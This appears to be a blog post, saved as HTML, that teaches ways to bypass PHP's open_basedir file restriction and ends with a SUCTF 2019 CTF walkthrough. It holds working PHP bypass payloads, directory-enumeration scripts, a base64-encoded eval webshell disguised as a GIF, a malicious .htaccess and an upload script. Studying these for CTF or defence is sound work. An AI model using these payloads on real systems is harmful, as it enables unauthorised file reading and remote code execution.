@@ -1,0 +1,691 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>Bypass open_basedir - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Bypass open_basedir">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-17 23:13" pubdate>
+        August 17, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Bypass open_basedir</h1>
+            
+            <div class="markdown-body">
+              <h2 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h2>
+<h4 id="open-basedir"><a class="header-anchor" href="#open-basedir">🍭</a>open_basedir</h4>
+<p>open_basedir是php的一个配置,它可将用户访问文件的活动范围限制在指定的区域如<code>open_basedir=/var/www/html/:/tmp/</code>，则用户无法获取除了/var/www/html/和/tmp/这两个目录以外的文件。<em>用open_basedir指定的限制实际上是前缀,而不是目录名</em>。若<code>open_basedir = /dir/user</code>, 那么目录 <code>/dir/user</code>和<code>/dir/user1</code>都是可以访问的。所以如果要将访问限制在仅为指定的目录，需用斜线结束路径名。</p>
+<h4 id="符号链接"><a class="header-anchor" href="#符号链接">🍭</a>符号链接</h4>
+<p>符号链接又叫软链接,是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。</p>
+<h2 id="绕过（linux）"><a class="header-anchor" href="#绕过（linux）">🍭</a>绕过（linux）</h2>
+<h4 id="命令执行函数"><a class="header-anchor" href="#命令执行函数">🍭</a>命令执行函数</h4>
+<p>open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。但命令执行函数一般都会被限制在disable_function当中，所以用处不大。</p>
+<h4 id="symlink-函数"><a class="header-anchor" href="#symlink-函数">🍭</a>symlink()函数</h4>
+<blockquote>
+<p>建立符号连接</p>
+ <pre><code class="hljs d">symlink(<span class="hljs-built_in">string</span> <span class="hljs-string">`$target`</span>, <span class="hljs-built_in">string</span> <span class="hljs-string">`$link`</span>): <span class="hljs-built_in">bool</span></code></pre>
+<p><strong>symlink()</strong> 对于已有的 <code>target</code> 建立一个名为 <code>link</code> 的符号连接。target:连接的目标,link:连接的名称.</p>
+</blockquote>
+<p>payload</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+        mkdir(<span class="hljs-string">&quot;c&quot;</span>);
+        chdir(<span class="hljs-string">&quot;c&quot;</span>);
+        mkdir(<span class="hljs-string">&quot;d&quot;</span>);
+        chdir(<span class="hljs-string">&quot;d&quot;</span>);
+        chdir(<span class="hljs-string">&quot;..&quot;</span>);
+        chdir(<span class="hljs-string">&quot;..&quot;</span>);
+        symlink(<span class="hljs-string">&quot;c/d&quot;</span>,<span class="hljs-string">&quot;tmplink&quot;</span>);
+        symlink(<span class="hljs-string">&quot;tmplink/../../1.txt&quot;</span>,<span class="hljs-string">&quot;exploit&quot;</span>);
+        unlink(<span class="hljs-string">&quot;tmplink&quot;</span>);
+        mkdir(<span class="hljs-string">&quot;tmplink&quot;</span>);
+        <span class="hljs-keyword">echo</span> file_put_contents(<span class="hljs-string">&quot;http://127.0.0.1/exploit&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h5 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h5>
+<pre><code class="hljs less"><span class="hljs-selector-tag">symlink</span>(<span class="hljs-string">&quot;tmplink/../../1.txt&quot;</span>,<span class="hljs-string">&quot;exploit&quot;</span>);</code></pre>
+<p>此时tmplink还是一个符号链接文件，它指向的路径是c/d，因此exploit指向的路径就变成了</p>
+<pre><code class="hljs awk">c<span class="hljs-regexp">/d/</span>..<span class="hljs-regexp">/../</span><span class="hljs-number">1</span>.txt</code></pre>
+<p>由于这个路径在open_basedir的范围之内所以exploit成功建立了。之后我们删除tmplink符号链接文件再新建一个同名为tmplink的文件夹，这时exploit所指向的路径为</p>
+<pre><code class="hljs awk">tmplink<span class="hljs-regexp">/../</span>../</code></pre>
+<p>这时候tmplink变成了一个真实存在的文件夹所以tmplink/…/…/变成了1.txt所在的目录即/var/www/，然后再通过访问符号链接文件exploit即可直接读取到1.txt的文件内容。</p>
+<p>另一种做法：</p>
+<pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);
+symlink(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);
+ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);
+symlink(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);
+unlink(<span class="hljs-string">&#x27;foo&#x27;</span>);
+symlink(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);
+<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);</code></pre>
+<h4 id="glob伪协议"><a class="header-anchor" href="#glob伪协议">🍭</a>glob伪协议</h4>
+<p>glob是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，它在筛选目录时不受open_basedir的限制。</p>
+<p>payload</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+        $a = <span class="hljs-string">&quot;glob:///xxx/xxx/xxx/*.php&quot;</span>;
+        <span class="hljs-keyword">if</span> ( $b = opendir($a) ) &#123;
+                <span class="hljs-keyword">while</span> ( ($file = readdir($b)) !== <span class="hljs-literal">false</span> ) &#123;
+                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename:&quot;</span>.$file.<span class="hljs-string">&quot;\n&quot;</span>;
+                &#125;
+                closedir($b);
+        &#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>读取指定目录下所有PHP文件</p>
+<h4 id="利用DirectoryIterator-Glob-直接列举目录"><a class="header-anchor" href="#利用DirectoryIterator-Glob-直接列举目录">🍭</a>利用DirectoryIterator + Glob 直接列举目录</h4>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));
+$file_list = <span class="hljs-keyword">array</span>();
+<span class="hljs-comment">// normal files</span>
+$it = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);
+<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) &#123;
+    $file_list[] = $f-&gt;__toString();
+&#125;
+<span class="hljs-comment">// special files (starting with a dot(.))</span>
+$it = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);
+<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) &#123;
+    $file_list[] = $f-&gt;__toString();
+&#125;
+sort($file_list);
+<span class="hljs-keyword">foreach</span>($file_list <span class="hljs-keyword">as</span> $f)&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h2 id="ini-set"><a class="header-anchor" href="#ini-set">🍭</a>ini_set</h2>
+<p>twiter上有一个bypass open_basedir的新方法 。<br>
+payload</p>
+<pre><code class="hljs gams">&lt;?php
+mkdir(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);
+chdir(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);
+<span class="hljs-function"><span class="hljs-title">ini_set</span>(<span class="hljs-params">&#x27;open_basedir&#x27;,&#x27;..&#x27;</span>)</span>;
+<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;
+<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;
+<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;
+<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;
+<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;
+ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);
+<span class="hljs-meta"><span class="hljs-meta-keyword">$a</span>=file_get_contents(&#x27;flag&#x27;);</span>
+var_dump(<span class="hljs-symbol">$</span>a);
+?&gt;</code></pre>
+<p>分析详见：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720#toc-0">bypass open_basedir的新方法</a></p>
+<h2 id="读目录"><a class="header-anchor" href="#读目录">🍭</a>读目录</h2>
+<p>学习大佬的脚本</p>
+<h4 id="win"><a class="header-anchor" href="#win">🍭</a>win</h4>
+<h5 id="realpath列举目录"><a class="header-anchor" href="#realpath列举目录">🍭</a>realpath列举目录</h5>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));
+printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));
+set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);
+$dir = <span class="hljs-string">&#x27;d:/test/&#x27;</span>;
+$file = <span class="hljs-string">&#x27;&#x27;</span>;
+$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;
+<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123; 
+    $file = $dir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;
+    realpath($file);
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params">$errno, $errstr</span>)</span>
+<span class="hljs-function"></span>&#123;
+    $regexp = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;
+    preg_match($regexp, $errstr, $matches);
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($matches[<span class="hljs-number">1</span>])) &#123;
+        printf(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, $matches[<span class="hljs-number">1</span>]);
+    &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h5 id="SplFileInfo-getRealPath列举目录"><a class="header-anchor" href="#SplFileInfo-getRealPath列举目录">🍭</a>SplFileInfo::getRealPath列举目录</h5>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));
+printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));
+$basedir = <span class="hljs-string">&#x27;D:/test/&#x27;</span>;
+$arr = <span class="hljs-keyword">array</span>();
+$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;
+<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123; 
+    $info = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>($basedir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>);
+    $re = $info-&gt;getRealPath();
+    <span class="hljs-keyword">if</span> ($re) &#123;
+        dump($re);
+    &#125;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dump</span>(<span class="hljs-params">$s</span>)</span>&#123;
+    <span class="hljs-keyword">echo</span> $s . <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;
+    ob_flush();
+    flush();
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h5 id="GD库imageftbbox-imagefttext列举目录"><a class="header-anchor" href="#GD库imageftbbox-imagefttext列举目录">🍭</a>GD库imageftbbox/imagefttext列举目录</h5>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));
+printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));
+set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);
+$dir = <span class="hljs-string">&#x27;d:/test/&#x27;</span>;
+$file = <span class="hljs-string">&#x27;&#x27;</span>;
+$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;
+<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123; 
+    $file = $dir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;
+    <span class="hljs-comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span>
+    <span class="hljs-comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span>
+    imageftbbox(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, $file, <span class="hljs-string">&#x27;aaa&#x27;</span>);
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params">$errno, $errstr</span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">global</span> $file;
+    <span class="hljs-keyword">if</span> (stripos($errstr, <span class="hljs-string">&#x27;Invalid font filename&#x27;</span>) === <span class="hljs-literal">FALSE</span>) &#123;
+        printf(<span class="hljs-string">&quot;%s&lt;br/&gt;&quot;</span>, $file);
+    &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h4 id="Linux"><a class="header-anchor" href="#Linux">🍭</a>Linux</h4>
+<h5 id="bindtextdomain暴力猜解目录"><a class="header-anchor" href="#bindtextdomain暴力猜解目录">🍭</a>bindtextdomain暴力猜解目录</h5>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));
+$re = bindtextdomain(<span class="hljs-string">&#x27;xxx&#x27;</span>, $_GET[<span class="hljs-string">&#x27;dir&#x27;</span>]);
+var_dump($re);
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>dir传入的参数是目录，如果目录存在，就返回目录路径，不存在就返回bool(false)，用于暴力猜解目录。</p>
+<h2 id="SUCTF-2019-EasyWeb"><a class="header-anchor" href="#SUCTF-2019-EasyWeb">🍭</a>[SUCTF 2019]EasyWeb</h2>
+<p>题目给了源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;
+    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span>
+    $userdir = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);
+    <span class="hljs-keyword">if</span>(!file_exists($userdir))&#123;
+    mkdir($userdir);
+    &#125;
+    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&quot;file&quot;</span>]))&#123;
+        $tmp_name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];
+        $name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];
+        $extension = substr($name, strrpos($name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>,$extension)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); 
+        <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==<span class="hljs-literal">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);
+    <span class="hljs-keyword">if</span>(!exif_imagetype($tmp_name)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); 
+        $path= $userdir.<span class="hljs-string">&quot;/&quot;</span>.$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    &#125;
+&#125;
+
+$hhh = @$_GET[<span class="hljs-string">&#x27;_&#x27;</span>];
+
+<span class="hljs-keyword">if</span> (!$hhh)&#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+
+<span class="hljs-keyword">if</span>(strlen($hhh)&gt;<span class="hljs-number">18</span>)&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);
+&#125;
+
+<span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);
+
+$character_type = count_chars($hhh, <span class="hljs-number">3</span>);
+<span class="hljs-keyword">if</span>(strlen($character_type)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);
+
+<span class="hljs-keyword">eval</span>($hhh);
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>先看get_the_flag()：</p>
+<p>过滤了文件后缀，不能出现“ph”，上传图片马配合 .htaccess 即可，且 exif_imagetype  判断一个图像的类型，读取一个图像的第一个字节并检查其签名，所以图片马的开头要加上GIF89a，文件内容中不能有“&lt;?”，所以要编码一下（原理详见.htaccess总结）：</p>
+<pre><code class="hljs abnf"><span class="hljs-attribute">GIF98a12GIF98a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2EnXSk7Pz4</span>=</code></pre>
+<p>.htaccess:</p>
+<pre><code class="hljs vala"><span class="hljs-meta">#define width 1</span>
+<span class="hljs-meta">#define height 1</span>
+AddType application/x-httpd-php .gif
+php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_a31f0ebf81054b852f70b3283d8594b8/shell.gif&quot;</span>
+<span class="hljs-meta">#先随便上传个文件确定文件存储位置</span></code></pre>
+<p>下面还有一个正则：</p>
+<pre><code class="hljs asciidoc">$hhh = @$<span class="hljs-emphasis">_GET[&#x27;_</span>&#x27;];
+......
+if ( preg<span class="hljs-emphasis">_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_</span>&amp;.,|=[\x7F]+/i&#x27;, $hhh) )
+<span class="hljs-code">    die(&#x27;Try something else!&#x27;);</span>
+......
+eval($hhh);</code></pre>
+<p>直接异或：</p>
+<pre><code class="hljs perl">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo   // &#123;$_GET&#125;&#123;%ff&#125;</code></pre>
+<p>然后用之前在本地写个upload.html上传文件，或者用脚本上传皆可</p>
+<pre><code class="hljs perl">import requests
+
+url = <span class="hljs-string">&quot;http://f627eb1d-1179-494e-ab98-f95610f52fd0.node4.buuoj.cn:81/?_=<span class="hljs-subst">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;</span>&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span>
+shell = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;shell.gif&#x27;</span>,<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;shell.gif&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>),<span class="hljs-string">&#x27;image/gif&#x27;</span>)&#125;
+r = requests.post(url=url,files=shell)
+<span class="hljs-keyword">print</span>(r.text)
+
+htaccess = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>),<span class="hljs-string">&#x27;image/gif&#x27;</span>)&#125;
+r2 = requests.post(url=url,files=htaccess)
+<span class="hljs-keyword">print</span>(r2.text)</code></pre>
+<p>得到目录</p>
+<p><img src="/2021/08/17/open/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>蚁剑连接</p>
+<p><img src="/2021/08/17/open/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>有限制，查看phpinfo</p>
+<p><img src="/2021/08/17/open/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>启用了open_basedir，用上面的int_set方法</p>
+<p>payload</p>
+<pre><code class="hljs mel">?penson=<span class="hljs-keyword">chdir</span>(%27img%27);ini_set(%27open_basedir%27,%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));</code></pre>
+<p>执行:</p>
+<p><img src="/2021/08/17/open/22.png" srcset="/img/loading.gif" alt="22"></p>
+<p>读取</p>
+<pre><code class="hljs mel">penson=<span class="hljs-keyword">chdir</span>(%27img%27);ini_set(%27open_basedir%27,%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);ini_set(%27open_basedir%27,%27/%27);echo file_get_contents(<span class="hljs-string">&#x27;/THis_Is_tHe_F14g&#x27;</span>);</code></pre>
+<p>执行：</p>
+<p><img src="/2021/08/17/open/23.png" srcset="/img/loading.gif" alt="23"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cf2cd07d02cf">https://www.jianshu.com/p/cf2cd07d02cf</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33810302/article/details/87981560">https://blog.csdn.net/weixin_33810302/article/details/87981560</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/bypass/">bypass</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/19/me/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buu（九）</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/16/ff3/">
+                        <span class="hidden-mobile">Bypass Disable Functions (三)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
